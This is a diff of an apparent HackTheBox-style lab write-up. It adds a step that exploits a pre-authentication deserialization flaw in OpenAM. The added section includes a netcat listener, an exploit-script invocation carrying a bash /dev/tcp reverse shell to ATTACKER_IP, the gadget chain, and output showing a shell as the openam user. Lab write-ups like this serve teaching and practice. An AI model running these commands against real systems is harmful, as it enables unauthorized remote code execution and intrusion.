@@ -568,7 +568,7 @@ Jars/: click-extras-2.3.0.jar  click-nodeps-2.3.0.jar  jato-shaded-16.0.5.jar
 <br>
 </div>
 
-### 3.3 Confirm the exploit interface and deserialization sink (Section 3: Exploitation & Initial Access)
+### 3.3 Confirm the exploit interface and deserialization sink
 
 **Why this step:** Before execution, confirm how the PoC is driven and verify its described sink matches the advisory, so the run is deliberate rather than copy-paste.
 
@@ -669,6 +669,58 @@ Args:  --url (OpenAM base, include /openam)  --command  --jars  --endpoint
 **What this gives you:** A confirmed invocation interface and a sink matching GHSA-2cqq-rpvq-g5qj. **Key finding:** the deserialization reads an attacker-controlled parameter with no allow-list, exactly the gap described in 3.2.1. The script auto-probes all three JATO endpoints by default.
 
 **Next:** Prove blind code execution out-of-band before attempting a shell.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 3.4 Fire the payload and catch the shell
+
+**Why this step:** With the environment prepared and the PoC understood, deliver a reverse-shell command through the `jato.clientSession` deserialization sink to obtain code execution as the OpenAM service user.
+
+**Commands:**
+
+Terminal 1, listener:
+
+```shell
+nc -lvnp 4444
+```
+
+Terminal 2, exploit (replace with your own VPN IP and port):
+
+```shell
+python3 '02 Exploit/Exploit_CVE_2026_33439.py' \
+  --url https://sso.management.htb/openam \
+  --jars '02 Exploit/Jars' \
+  --command 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+```
+
+**Breakdown:**
+
+- `--url .../openam` targets the OpenAM application root (the `/openam` path is required).
+- `--jars '02 Exploit/Jars'` points the payload builder at the bundled OpenAM/Click/Xalan classes so the gadget chain matches the server classpath.
+- `--command 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` is the reverse shell; the script wraps it in a shell so the `>&` redirection is honored.
+
+**Result (IPs scrubbed):**
+
+```
+[*] Building gadget chain    | PriorityQueue → Column$ColumnComparator → TemplatesImpl → EvilTranslet
+[+] Payload ready            | 4343 chars (URL-safe base64)
+[*] Delivering payload       | method=GET | /ui/PWResetUserValidation  → HTTP 200
+[*] Delivering payload       | method=GET | /ui/PWResetQuestion        → HTTP 200
+[*] Delivering payload       | method=GET | /ui/Login                  → HTTP 200
+
+# listener
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 54464
+bash: cannot set terminal process group (1695): Inappropriate ioctl for device
+openam@management:/$
+```
+
+**What this gives you:** An interactive shell as the `openam` user. **Key finding:** pre-authentication remote code execution achieved with no credentials. Execution is decoupled from the HTTP response (the responses return 200 regardless), so success is confirmed on the listener, not in the script output.
+
+**Next:** Stabilize the raw shell into a full TTY, then enumerate the local system.
 <div align="center">
 <br>
 <br>
